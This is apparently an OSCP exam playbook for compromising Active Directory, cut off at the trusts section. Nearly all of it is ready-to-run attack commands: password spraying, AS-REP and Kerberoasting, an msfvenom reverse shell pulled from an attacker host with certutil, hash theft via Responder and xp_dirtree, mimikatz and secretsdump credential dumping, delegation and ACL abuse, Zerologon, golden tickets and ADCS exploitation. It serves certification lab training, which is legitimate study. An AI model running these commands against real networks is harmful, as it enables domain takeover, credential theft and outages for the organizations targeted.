# OSCP Active Directory — Exam Playbook

**Recon → Enumeration → Initial Foothold → Lateral Movement → Privilege Escalation → Domain Dominance (root).**

> **Golden rule for the exam:** _Any time you get a new credential (user/pass or NT hash), go back to the start and re-enumerate everything with it._ Spray it across every protocol and every host, including `--local-auth` and NTLM.

---

## 0. Mindset & Overall Workflow

The AD set is usually: an entry host (e.g. **MS01**) → pivot → a second host (**MS02**) → **DC01**. The loop:

1. Full port scan the host, enumerate services.
2. Get a foothold (web exploit, credential, spray, roast).
3. Local privilege escalation on that host → local admin / SYSTEM.
4. Dump all credentials (hashes, tickets, cleartext, files).
5. Enumerate AD with the new creds (BloodHound, shares, roasting).
6. Move laterally with harvested creds/hashes/tickets.
7. Repeat until you own the Domain Controller.

**Exam checklist (keep this visible):**

- Scan all TCP ports, then deep scan found ports. Check UDP if stuck.
- Check LDAP, RPC, SMB with anonymous/null/guest access; look for public shares.
- Find usernames (RID brute, `--users`, rpcclient `enumdomusers`) — no creds needed.
- Validate usernames with `kerbrute`.
- AS-REP roast once you have usernames (no creds needed).
- Kerberoast once you have any domain user + password.
- Authenticate with every protocol for every credential set: winrm, rdp, mssql, smb, rpc, ldap — including `--local-auth`.
- Enumerate shares for **every** user you compromise (re-check on each new user).
- On a shell: run privesc checks, dump all hashes, collect them for cracking/lateral movement.
- Run BloodHound; check attack paths, roasting, DCSync, **Outbound Object Control** (GenericAll/GenericWrite/WriteDACL/WriteOwner).
- Check certificate attacks with **Certipy**.
- Check writable paths → coerce auth with **Responder** to steal hashes.
- If AD, look for extra network adapters → set up a pivot (ligolo-ng) and relay tools through the jumphost.
- Add all machines to `/etc/hosts`.
- Rescan if stuck; verify your tools actually work and you're running them right.

---

## 1. Recon

### 1.1 External / passive recon (OSINT)

Useful when given a domain rather than just an IP. What to look for:

- **IP space / ASN:** Hurricane Electric **BGP Toolkit**, ARIN/RIPE/IANA, DNS records. Large orgs self-host (own ASN); small ones hide behind Cloudflare/AWS/Azure/GCP.
- **Domain info:** DomainTools, PTRArchive, ICANN, viewdns.info, manual DNS queries (incl. against 8.8.8.8). Find subdomains, mail/VPN/DNS portals, and defenses (SIEM/AV/IDS).
- **Schema format:** email + AD username format + password policy → build username lists for spraying/credential stuffing.
- **Data disclosures:** public `.pdf/.ppt/.docx/.xlsx` — intranet listings, metadata, usernames, creds. Google dorks: `filetype:pdf inurl:target.com`.
- **Breach data:** HaveIBeenPwned, Dehashed (cleartext/hashes to try against Citrix, RDS, OWA, O365, VPN, VMware Horizon).
- **Dev leaks:** GitHub, S3 buckets, Azure Blobs; **TruffleHog**, **Greyhat Warfare** for hardcoded creds.

### 1.2 Active network recon

Ports relevant to AD: **53 (DNS), 88 (Kerberos), 135 (RPC), 139/445 (SMB), 389/636 (LDAP/LDAPS), 464 (kpasswd), 3268/3269 (Global Catalog), 5985/5986 (WinRM)**.

```bash
# Fast full TCP scan
sudo nmap -T4 -p- -v <host> -oN nmap-ports.log

# Deep scan on found ports
sudo nmap -T4 -p<ports> -sCV -v <host> -oN nmap-services.log

# Targeted AD-services scan / subnet sweep
nmap -sS -Pn -p 53,88,135,139,389,445,464,636,3268,5985,5986 -sV -oA scans/ad-target <host>

# DNS SRV records → locate DCs
dig _ldap._tcp.dc._msdcs.<domain> SRV +short
host -t SRV _kerberos._tcp.<domain>
```

If you see **80/443**, immediately run `gobuster`; chase uploads folders, phpinfo, dashboards → manual enumeration. Web exploit is a common first foothold before any AD is touched.

Verify time against the DC early (Kerberos is time-sensitive):

```bash
sudo ntpdate <DC-IP>      # or rdate; fixes KRB_AP_ERR_SKEW (Clock skew too great)
```

---

## 2. AD Enumeration

### 2.1 Unauthenticated / low-priv enumeration (no creds yet)

```bash
# SMB null / guest sessions — shares
nxc smb $IP -u '' -p '' --shares
nxc smb $IP -u 'guest' -p '' --shares
smbclient -L \\\\$IP -N
smbmap -H $IP

# RPC null session → enumerate domain users
rpcclient -U "" $IP            # then: enumdomusers, querydominfo, etc.
enum4linux -a $IP

# Pull user list via RID brute (no creds)
nxc smb $IP -u '' -p '' --rid-brute | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | grep -v '\$' > users

# LDAP anonymous bind
ldapsearch -x -h <dc.domain> -b "DC=example,DC=local" "(objectClass=user)"
ldapsearch -x -h <dc.domain> -b "DC=example,DC=local" "(objectClass=computer)" cn

# Validate usernames against the DC (look for NO PREAUTH → AS-REP roastable)
kerbrute userenum -d <domain> --dc <DC-IP> users.txt
```

### 2.2 Authenticated enumeration — NetExec / CrackMapExec (`nxc` / `cme`)

`nxc` supports: `smb / winrm / mssql / ldap / ftp / ssh / rdp`. Add `--local-auth` if domain creds fail. **`Pwn3d!`** = admin access on that host.

```bash
# Shares, disks, sessions, users, policy
nxc smb <range> -u 'user' -p 'pass' --shares
nxc smb <range> -u 'user' -p 'pass' --disks
nxc smb <range> -u 'user' -p 'pass' --sessions
nxc smb <DC-IP>  -u 'user' -p 'pass' --users
nxc smb <range> -u 'user' -p 'pass' --pass-pol
nxc smb <range> -u 'user' -p 'pass' --groups "Domain Admins"

# Credential material (needs admin on target)
nxc smb <range> -u 'user' -p 'pass' --sam        # local SAM hashes
nxc smb <range> -u 'user' -p 'pass' --lsa        # LSA secrets
nxc smb <range> -u 'user' -p 'pass' --ntds       # dump NTDS.dit

# Command execution
nxc smb <host> -u 'user' -p 'pass' -x 'cmd'      # -X for PowerShell

# WinRM check (look for Pwn3d! → evil-winrm works)
nxc winrm <host> -u 'user' -p 'pass'

# Export user list for roasting/spraying
nxc smb $IP -u <u> -p <p> --users-export users

# Modules
nxc smb -L                                       # list modules
nxc smb <host> -u 'user' -p 'pass' -M gpp_password
nxc smb <host> -u 'user' -p 'pass' -M mimikatz
```

CME/NXC database: `cmedb` to review everything collected so far.

### 2.3 PowerView (run on a Windows foothold)

```powershell
Import-Module .\PowerView.ps1   # if blocked: Set-ExecutionPolicy Bypass -Scope Process

Get-NetDomain                                    # domain info
Get-NetUser                                      # all users (| select cn,samaccountname ...)
Get-NetGroup; Get-NetGroup "Domain Admins" | Get-NetGroupMember
Get-NetComputer -FullData                        # computer objects
Get-NetOU; Get-DomainForest
Find-LocalAdminAccess                            # where current user is local admin
Get-NetSession -ComputerName <host> -Verbose     # logged-on users / sessions
Get-NetUser -SPN | select samaccountname,serviceprincipalname   # Kerberoastable
Get-DomainUser -PreauthNotRequired -verbose      # AS-REP roastable
Find-DomainShare                                 # domain shares

# ACL / object-control hunting (privesc paths)
Get-ObjectAcl -Identity <user>                                       # ACEs + SIDs
Convert-SidToName <SID>
Get-ObjectAcl -Identity "group" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
Get-NetUser | Get-ObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner" }
Get-ObjectAcl -SamAccountName 'DOMAIN\user' -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "ReplicatingDirectoryChanges" }   # DCSync-capable
```

### 2.4 BloodHound / SharpHound

**Collect (from a Windows foothold):**

```powershell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory <loc> -OutputPrefix "name"
# or compiled:  SharpHound.exe --CollectionMethods All --ZipFileName blood.zip
```

```
Via sharphound (more recent than ps1)
.\SharpHound.exe --CollectionMethods -all --Domain <domain> --OutputPrefix "whatever"
```

**Collect (remotely from Kali):**

```bash
bloodhound-python -u 'user' -p 'pass' -d <domain> -ns <DC-IP> -c all
nxc ldap <DC-IP> -u <u> -p <p> --bloodhound --collection All --dns-server <DC-IP>
```

**Run BloodHound CE (the install that worked):**

```bash
sudo apt install docker.io docker-compose -y
sudo systemctl enable --now docker
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli install        # prints admin password
./bloodhound-cli up             # start   (down = stop, resetpwd = reset)
# UI: http://127.0.0.1:8080/ui/login
```

Legacy BloodHound: `sudo neo4j console` (default kali `neo4j:Blood123!`), then upload the `.json`/zip. **If stuck at 0% upload, don't upload `computers.json`.** Cypher cheatsheet: hausec.com/2019/09/09/bloodhound-cypher-cheatsheet.
Parse raw JSON: `cat <file>.json | jq '.data[].Properties.name' -r`
**In BloodHound look for:** shortest paths to Domain Admins, Kerberoastable/AS-REP-roastable users, DCSync rights, and **Outbound Object Control** on your owned users.

### 2.5 Other enumeration helpers

- **ldapdomaindump:** `sudo ldapdomaindump ldaps://<IP> -u 'user' -p 'pass'` (run in a new folder → browsable HTML).
- **PlumHound:** needs Neo4j+BloodHound running. `python3 PlumHound.py -x tasks/default.tasks -p <neo4jpass>` → `firefox index.html`.
- **PingCastle:** run on Windows, give domain → produces a report (`pingcastle.com`).
- **windapsearch / adfind:** other LDAP helpers.
- **PsLoggedon:** `.\PsLoggedon.exe \\<computer>` — remote logon sessions.

---

## 3. Initial Foothold (getting first creds / first shell)

### 3.1 Web / service exploit → shell (two-step delivery)

```bash
# 1) Build the payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali> LPORT=<port> -f exe -o shell.exe
# 2) Transfer to target and run (start a listener + python server first!)
#    On target:
certutil -urlcache -split -f http://<kali>/shell.exe shell.exe
python3 -m http.server 80     # <- don't forget the server
```

### 3.2 Finding credentials in shares / files

```bash
smbclient //$IP/C$ -U 'DOMAIN\user'
smbmap -H $IP -u 'user' -p 'pass'
grep -iR "password" /mnt/share
```

On Windows:

```cmd
findstr /si password *.txt *.xml *.config
dir /s *pass*   &   dir /s *.config   &   dir /s *.xml   &   dir /s *.txt
```

Look in: `C:\Program Files\`, `C:\ProgramData\`, `C:\inetpub\`, `C:\Users\`.

### 3.3 GPP / cPassword (SYSVOL)

Group Policy Preferences store an AES-encrypted password with a **public** key → trivially decryptable.

```bash
# Impacket Get-GPPPassword
Get-GPPPassword.py -no-pass 'DC'                                  # null session
Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DC'
Get-GPPPassword.py -hashes :'NThash' 'DOMAIN'/'USER'@'DC'         # pass-the-hash
Get-GPPPassword.py -xmlfile '/path/Policy.xml' 'LOCAL'            # parse local file

# NetExec / CME module
nxc smb <target> -u <user> -p <pass> -d <domain> -M gpp_password
nxc smb <target> -u <user> -H LMHash:NTLMHash -d <domain> -M gpp_password

# Manual: download SYSVOL, grep, decrypt
grep -inr "cpassword"
gpp-decrypt "<cpassword>"
```

### 3.4 LLMNR / NBT-NS / mDNS poisoning (Responder)

If you have a writable share or can coerce a victim to browse to your host, capture NetNTLM hashes.

```bash
sudo responder -I eth0 -wrf       # capture NetNTLMv1/v2 hashes → crack offline (not passable)
```

- **Upload a malicious `.url`/`.lnk` shortcut to a writable SMB share** (vault-box technique) → victim browsing triggers auth → capture NetNTLM hash → crack with John.
- NetNTLMv2 can only be **cracked**, not passed. (NetNTLMv1 is weaker.)

### 3.5 Password spraying

```bash
# NetExec / CME (Pwn3d! = admin). --continue-on-success for ranges/subnets.
nxc smb <IP or subnet> -u users.txt -p 'Season2024!' -d <domain> --continue-on-success
crackmapexec smb <range> -u users -p passwords -d <domain> --continue-on-success | grep '[+]'

# Kerbrute (fast, quieter)
kerbrute passwordspray -d <domain> users.txt 'Password1'
```

No known username but have a password? On a box, dump every user and test which matches:

```powershell
Get-ADUser -filter * | select samaccountname   # → userlist, then spray the found password
```

### 3.6 AS-REP Roasting (no creds needed if you have a username list)

Targets accounts with **"Do not require Kerberos preauthentication"** enabled.

```bash
# Kali, with a user list (no creds)
impacket-GetNPUsers <domain>/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast
# Kali, with creds (requests for roastable accounts)
impacket-GetNPUsers -dc-ip <DC-IP> <domain>/<user>:<pass> -request -outputfile hashes.asreproast
nxc ldap <DC-IP> -u users.txt -p '' --asreproast asreproast.out

# Windows (compromised host)
.\Rubeus.exe asreproast /nowrap /format:hashcat

# Crack (mode 18200)
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

**Targeted AS-REP Roasting** — if no account is roastable but you have **GenericAll/GenericWrite** over a user, flip the "don't require preauth" bit, roast, then **restore it**:

```powershell
# PowerView (Windows)
Set-DomainObject -Identity <victim> -XOR @{useraccountcontrol=4194304} -Verbose   # enable DONT_REQ_PREAUTH
Get-DomainUser <victim> | Get-DomainSPNTicket   # or roast via Rubeus/impacket
Set-DomainObject -Identity <victim> -XOR @{useraccountcontrol=4194304} -Verbose   # toggle back off
```

```bash
# Linux (bloodyAD)
bloodyAD -u <user> -p <pass> -d <domain> --host <DC> add uac <victim> -f DONT_REQ_PREAUTH
impacket-GetNPUsers <domain>/ -usersfile <(echo <victim>) -format hashcat -outputfile asrep.txt
bloodyAD -u <user> -p <pass> -d <domain> --host <DC> remove uac <victim> -f DONT_REQ_PREAUTH
```

### 3.7 Kerberoasting (needs any domain user + password)

Targets **user-account** SPNs (service accounts). Computer/MSA/gMSA SPNs have 120-char random passwords → not crackable.

```bash
# Kali
impacket-GetUserSPNs -request -dc-ip <DC-IP> <domain>/<user>:<pass> -outputfile kerb.hashes
nxc ldap <DC-IP> -u <u> -p <p> --kerberoasting kerberoasting.out

# Windows
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

# Crack (mode 13100)
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

**Blind / no-preauth Kerberoasting** (combine an AS-REP-roastable user to roast SPNs without creds):

```bash
# Linux
GetUserSPNs.py -no-preauth "<asrep_user>" -usersfile users.txt -dc-host <DC-IP> "<domain>"/
# Windows
Rubeus.exe kerberoast /domain:<domain> /dc:<DC-IP> /nopreauth:<asrep_user> /spns:users.txt
```

**Targeted Kerberoasting** — with **GenericAll/GenericWrite** over a user, set a fake SPN, roast, then **remove it**:

```powershell
# PowerView (Windows)
Set-DomainObject -Identity <victim> -Set @{serviceprincipalname='fake/SVC'} -Verbose
Get-DomainUser <victim> | Get-DomainSPNTicket   # grab the TGS-REP hash
Set-DomainObject -Identity <victim> -Clear serviceprincipalname -Verbose
```

```bash
# Linux
targetedKerberoast.py -v -d <domain> -u <user> -p <pass>          # auto add/roast/cleanup
# or manually with impacket-addspn + impacket-GetUserSPNs then crack -m 13100
```

### 3.8 Cracking notes

- AS-REP = `-m 18200`; Kerberoast TGS = `-m 13100`; NTLM = `-m 1000`; NetNTLMv2 = `-m 5600`.
- If plain wordlist fails, add a ruleset: `-r /usr/share/hashcat/rules/best64.rule`.
- If best64 fails too → consider it uncrackable for OSCP and move on.

### 3.9 Getting a session with creds

```bash
evil-winrm -i $IP -u 'user' -p 'pass'
evil-winrm -i $IP -u 'user' -H <NThash>           # pass-the-hash over WinRM
xfreerdp3 /v:$IP /u:'user' /p:'pass' /cert:ignore /dynamic-resolution /drive:linux,/opt/ +clipboard
winrs -r:<computer> -u:<user> -p:<pass> "command" # then launch a PS reverse shell
```

### 3.10 MSSQL in AD (port 1433)

MSSQL is a common AD foothold/lateral vector — service runs as a domain account and often allows command execution.

```bash
# Discover + check login (domain auth with -windows-auth, or SQL auth)
nxc mssql <range> -u <user> -p <pass> --local-auth
nxc mssql <host> -u <user> -p <pass> -x 'whoami'           # -x cmd, -X powershell
mssqlclient.py <domain>/<user>:<pass>@<host> -windows-auth
mssqlclient.py <domain>/<user>:<pass>@<host> -windows-auth -hashes <LM>:<NT>
```

Inside the `SQL>` prompt:

```sql
enable_xp_cmdshell          -- impacket helper; or:
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
xp_cmdshell whoami

-- Steal the service account NetNTLM hash via UNC → Responder/ntlmrelayx
exec master..xp_dirtree '\\<kali-ip>\share'
exec master..xp_subdirs  '\\<kali-ip>\share'

-- Impersonate another DB login (common privesc to sa)
enum_impersonate            -- impacket; then:
EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;

-- SQL links → execute on linked servers (lateral movement between SQL hosts)
enum_links
EXECUTE('xp_cmdshell ''whoami''') AT [LINKED\SERVER];
```

---

## 4. Lateral Movement

> Always pass the **full** LM:NT hash to these tools (e.g. `aad3b435b51404eeaad3b435b51404ee:<NThash>`).

### 4.1 Remote execution (Impacket) — with password or hash

```bash
psexec.py  <domain>/<user>:<pass>@<IP>              # needs write access to ADMIN$
psexec.py  -hashes <LM>:<NT> <domain>/<user>@<IP> <command>
smbexec.py <domain>/<user>:<pass>@<IP>
smbexec.py -hashes <LM>:<NT> <domain>/<user>@<IP> <command>
wmiexec.py <domain>/<user>:<pass>@<IP>
wmiexec.py -hashes <LM>:<NT> <domain>/<user>@<IP> <command>
atexec.py  -hashes <LM>:<NT> <domain>/<user>@<IP> <command>
```

### 4.2 Pass-the-Hash (NTLM) via CME/NXC

```bash
crackmapexec smb <ip or range> -u username -H <NThash> --local-auth
nxc winrm <IP> -u 'user' -H <NThash>
evil-winrm -i $IP -u 'user' -H <NThash>
```

### 4.3 Pass-the-Ticket (.kirbi)

```powershell
.\mimikatz.exe
sekurlsa::tickets /export
kerberos::ptt [0;...]-2-0-...-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
klist
dir \\<RHOST>\admin$
```

### 4.4 Overpass-the-Hash (hash → Kerberos TGT)

Turn an NT hash (or AES key) into a full Kerberos TGT, then use Kerberos-only services / tools that need a ticket.

```powershell
# Mimikatz — spawns a process with the ticket; NT hash as /rc4 (or /aes256 for stealth)
privilege::debug
sekurlsa::pth /user:<user> /domain:<domain> /rc4:<NThash> /run:powershell.exe
# in the new shell, trigger a TGT then use it:
klist
.\PsExec.exe \\<host> cmd.exe
```

```powershell
# Rubeus — request a TGT from a hash and inject it
.\Rubeus.exe asktgt /user:<user> /rc4:<NThash> /domain:<domain> /dc:<DC-IP> /ptt
.\Rubeus.exe asktgt /user:<user> /aes256:<aeskey> /domain:<domain> /ptt   # preferred
```

```bash
# Linux — request a TGT with the hash, export to KRB5CCNAME, then use -k
impacket-getTGT <domain>/<user> -hashes :<NThash>
export KRB5CCNAME=<user>.ccache
impacket-psexec -k -no-pass <domain>/<user>@<host>
nxc smb <host> --use-kcache
```

### 4.5 DCOM lateral execution

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<target-IP>"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <base64>","7")
```

### 4.6 Re-enable / re-access

```bash
# Turn on RDP to get back in easily
netexec smb $IP -u administrator -p pass123 -M rdp -o ACTION=enable
```

### 4.7 Pivoting (ligolo-ng)

When a foothold host has a second NIC into the AD network:

1. Set up ligolo-ng (agent on compromised host, proxy on Kali).
2. Add the IP route for the internal subnet; `ping` the DC to confirm.
3. Relay **all** tools through the jumphost to reach MS02 / DC01.
4. Then enumerate the DC as a domain user:

```bash
sudo nmap -p- -sCV --open -v dc01 -oN nmap-dc.log
# enum smb as domain user (set WORKGROUP/domain before username)
```

Check listening ports on each host in case you need extra port-forwards.

### 4.8 Kerberos Delegation Abuse

Find delegation in BloodHound ("Find Computers with Unconstrained/Constrained Delegation") or:

```powershell
Get-DomainComputer -Unconstrained | select name                         # unconstrained
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto # constrained
Get-DomainUser -TrustedToAuth
```

```bash
findDelegation.py <domain>/<user>:<pass>    # impacket — lists all delegation types
```

**(a) Unconstrained delegation** — on a host with it, any user who authenticates leaves a usable TGT in memory. Capture a DC's TGT by coercing it, then DCSync.

```powershell
.\Rubeus.exe monitor /interval:5 /nowrap          # watch for incoming TGTs
# coerce the DC to authenticate to you (PrinterBug / PetitPotam):
# SpoolSample.exe <DC> <unconstrained-host>   OR   printerbug.py <domain>/<user>:<pass>@<DC> <host>
.\Rubeus.exe ptt /ticket:<captured-DC-TGT-base64>
# now the DC's TGT is injected → DCSync (see §6.2)
```

**(b) Constrained delegation** — account can delegate to specific SPNs. Use S4U to impersonate any user (e.g. Administrator) to those services.

```powershell
.\Rubeus.exe s4u /user:<svc> /rc4:<svcNThash> /impersonateuser:Administrator /msdsspn:"cifs/target.domain" /ptt
```

```bash
impacket-getST -spn cifs/target.domain -impersonate Administrator -hashes :<svcNThash> <domain>/<svc>
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <domain>/Administrator@target.domain
```

**(c) Resource-Based Constrained Delegation (RBCD)** — if you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer (e.g. GenericWrite/GenericAll over it): add a machine account you control, set RBCD, then S4U.

```bash
# 1) Add a computer you control (default MachineAccountQuota=10 allows this)
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Pass123!' <domain>/<user>:<pass>
# 2) Configure RBCD on the victim computer to trust EVIL$
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'VICTIM$' -action write <domain>/<user>:<pass>
# 3) S4U to impersonate Administrator to the victim
impacket-getST -spn cifs/victim.domain -impersonate Administrator -dc-ip <DC> <domain>/'EVIL$':'Pass123!'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <domain>/Administrator@victim.domain
```

```powershell
# PowerView equivalent for step 2
$sid = (Get-DomainComputer EVIL).objectsid
Set-DomainObject VICTIM -Set @{'msds-allowedtoactonbehalfofotheridentity'=<rawSDDLbytes>}
```

---

## 5. Privilege Escalation (local, on each host)

### 5.1 First-look enumeration

```cmd
whoami  &  whoami /priv  &  whoami /groups  &  whoami /all
hostname  &  ipconfig /all  &  systeminfo
query user  &  qwinsta                      :: logged-in users
tasklist /v
schtasks /query /fo LIST /v                 :: scheduled tasks
sc query                                    :: services
wmic service get name,displayname,pathname,startmode   :: find unquoted service paths
icacls "C:\path\to\service.exe"             :: check permissions
net user /domain  &  net group /domain  &  net group "Domain Admins" /domain
```

Then: non-default folders on `C:\`, non-default software in `Program Files`, `tree /F /A C:\Users`, hidden files:

```cmd
tree /f /a
dir /s/b *.txt  &  dir /s/b *.log  &  dir /s/b *.xml
```

### 5.2 Automated tools

Run `whoami /all`, then **PowerUp / PrivEscCheck**, then **WinPEAS**. Save output and read it slowly.
WinPEAS priorities:

- Cached logons, PowerShell history, whether NTLMv2 (crack only, can't pass).
- Users (is the local admin disabled?), ever-logged-on users (new usernames).
- **Services**: missing quotes + spaces **and** writable (writedata/createfiles) → drop your reverse shell as e.g. `wise.exe`.
- If nothing lands, try listed CVEs / kernel exploits.

### 5.3 Token-privilege abuse (`whoami /priv`)

- **SeImpersonatePrivilege** → **PrintSpoofer** or a **Potato** (JuicyPotato/RoguePotato/GodPotato depending on Windows version) → SYSTEM.
- **SeRestorePrivilege** → `SeRestoreAbuse.exe` (github.com/dxnboy/redteam), or **SharpGPOAbuse**:
  ```cmd
  .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy"
  :: then re-login via impacket-psexec after the GPO change
  ```
  SharpGPOAbuse can also get a specific-system shell for the flag screenshot.
- **SeShutdownPrivilege** → replace a service binary, then reboot to trigger it.
- **SeBackupPrivilege** → read SAM/SYSTEM/NTDS offline.

### 5.4 After local admin / SYSTEM — dump everything

```bash
# Mimikatz (one-liner)
.\mimikatz.exe "log" "privilege::debug" "token::elevate" "lsadump::lsa /inject" "sekurlsa::logonpasswords" exit

# Impacket secretsdump (password / PtH / local vs domain)
secretsdump.py <domain>/<user>:<pass>@<IP>
secretsdump.py <user>@<IP> -hashes <LM>:<NT>              # local user
secretsdump.py <domain>/<user>@<IP> -hashes <LM>:<NT>     # domain user

# Other grabbers
.\lazagne.exe all
```

Then: **Creds found?** → go back to §3.5/§4 and authenticate with every protocol (incl. `--local-auth`, NTLM). **No creds?** → pivot and search the filesystem again.

### 5.5 ACL / Object-Control Abuse (AD privesc paths)

BloodHound shows these as **Outbound Object Control** edges on your owned users. What each right lets you do and how to abuse it:

| Right over target                                 | Abuse                                                                                |
| ------------------------------------------------- | ------------------------------------------------------------------------------------ |
| **GenericAll / GenericWrite** on a **user**       | Targeted Kerberoast (§3.7) or Targeted AS-REP (§3.6); or force-change their password |
| **GenericAll / GenericWrite** on a **computer**   | Set up RBCD (§4.8c)                                                                  |
| **GenericAll** on a **group**                     | Add yourself to the group                                                            |
| **ForceChangePassword** on a **user**             | Reset their password (no old pw needed)                                              |
| **WriteDACL / WriteOwner** on any object          | Grant yourself more rights, then abuse                                               |
| **AddMember / WriteProperty (member)** on a group | Add yourself to the group                                                            |

```powershell
# PowerView (Windows)
Set-DomainUserPassword -Identity <victim> -AccountPassword (ConvertTo-SecureString 'Pass123!' -AsPlainText -Force)
Add-DomainGroupMember -Identity 'Domain Admins' -Members <me> -Verbose
# WriteOwner → take ownership → grant GenericAll → then act
Set-DomainObjectOwner -Identity <target> -OwnerIdentity <me>
Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <me> -Rights All
```

```bash
# Linux equivalents
net rpc password "<victim>" "NewPass123!" -U "<domain>/<user>%<pass>" -S <DC>   # force change pw
bloodyAD -u <user> -p <pass> -d <domain> --host <DC> set password <victim> 'NewPass123!'
bloodyAD -u <user> -p <pass> -d <domain> --host <DC> add groupMember 'Domain Admins' <me>
bloodyAD -u <user> -p <pass> -d <domain> --host <DC> set owner <target> <me>
dacledit.py -action write -rights FullControl -principal <me> -target <target> <domain>/<user>:<pass>  # WriteDACL
```

---

## 6. Domain Dominance (getting "root" = owning the DC)

### 6.1 Dump the domain database (NTDS.dit)

```bash
# Remotely, with DA/admin creds or hash
secretsdump.py <domain>/<user>:<pass>@<DC> -just-dc-ntlm   # NTLM hashes only
nxc smb <DC> -u <user> -p <pass> --ntds
```

**Shadow Copy method** (on the DC as admin, abuse VSS to copy the locked NTDS.dit):

```cmd
vshadow.exe -nw -p C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
```

```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
add hashes to file
cat hashes|cut -d : -f 4
use crackstation or local
```

### 6.2 DCSync

Any account with **Replicating Directory Changes (All)** rights can pull hashes from the DC without touching it.

```powershell
lsadump::dcsync /user:krbtgt        # Mimikatz
```

```bash
secretsdump.py <domain>/<user>:<pass>@<DC>   # Impacket performs DCSync for -just-dc
```

### 6.3 Zerologon (CVE-2020-1472)

Unauthenticated: sets the DC **machine account** password to empty → DCSync with no creds. **Destructive** — it breaks the DC's secure channel; restore the original password afterward or the DC may fall out of the domain.

```bash
# 1) Exploit (sets DC machine-account pw to empty)
git clone https://github.com/dirkjanm/CVE-2020-1472
python3 cve-2020-1472-exploit.py <DC-NETBIOS-NAME> <DC-IP>

# 2) DCSync using the now-empty machine account hash
secretsdump.py -just-dc <domain>/'<DC-NAME>$'@<DC-IP> -no-pass
# (nxc also has a module)
nxc smb <DC-IP> -u '' -p '' -M zerologon

# 3) RESTORE the original machine password (take it from secretsdump's $MACHINE.ACC)
python3 restorepassword.py <domain>/'<DC-NAME>$'@<DC-NAME> -target-ip <DC-IP> -hexpass <hex>
```

### 6.4 Silver Ticket (forge a TGS for one service)

Needs: the **service account's NTLM hash** + the **domain SID**.

```powershell
# get the SPN account hash
privilege::debug
sekurlsa::logonpasswords
# domain SID: whoami /user  → drop the trailing RID
kerberos::golden /sid:<domainSID> /domain:<domain> /ptt /target:<host.domain> /service:<svc> /rc4:<NThash> /user:<anyuser>
klist
# access the service
iwr -UseDefaultCredentials <service>://<host>
```

### 6.5 Golden Ticket (forge TGTs — full-domain persistence)

Needs: the **krbtgt NTLM hash** + the **domain SID**. The krbtgt password rarely changes → tickets last.

```powershell
.\mimikatz.exe
privilege::debug
# get krbtgt hash (any of these):
lsadump::lsa /inject /name:krbtgt
lsadump::lsa /patch
lsadump::dcsync /user:krbtgt
kerberos::purge                       # clear existing tickets first
# Post-2022: supply a real account name (e.g. jen)
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-... /krbtgt:<krbtgtNThash> /ptt
misc::cmd
PsExec.exe \\dc1 cmd.exe
```

(User ID defaults to 500 = built-in administrator; group IDs include Domain Admins.)

### 6.6 Certificate attacks (ADCS) — Certipy

Run this early once you have any domain creds — ADCS misconfigs give a fast path to DA. General flow: **find vulnerable template → request a cert impersonating a privileged user → authenticate with the cert → get TGT + NT hash.**

```bash
# Enumerate — flags vulnerable templates as ESC1..ESC8
certipy find -u <user>@<domain> -p <pass> -dc-ip <DC-IP> -vulnerable -stdout
```

**ESC1** (template allows enrollee to supply any SAN):

```bash
certipy req -u <user>@<domain> -p <pass> -dc-ip <DC-IP> -ca <CA-NAME> -template <template> -upn administrator@<domain>
# → administrator.pfx ; then authenticate:
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>      # returns TGT + NT hash
```

**ESC8** (NTLM relay to the CA web endpoint → cert for a relayed machine/DC):

```bash
certipy relay -target 'http://<CA-host>' -template DomainController
# coerce the DC to authenticate (PetitPotam / printerbug) → relay issues a DC cert → certipy auth
```

Other templates: **ESC2/3** (Any Purpose / enrollment agent), **ESC4** (writable template ACL → make it ESC1), **ESC6** (CA `EDITF_ATTRIBUTESUBJECTALTNAME2`), **ESC7** (CA-manager rights). For each: `certipy` has a matching sub-flow; the end state is always `certipy auth -pfx ...` → hash/TGT → §6.1/§6.2.

```bash
# Use the recovered hash directly
secretsdump.py <domain>/administrator@<DC-IP> -hashes :<NThash> -just-dc
```

### 6.7 Domain / Forest Trusts

After owning one domain, enumerate trusts for lateral movement to parent/other domains.

```powershell
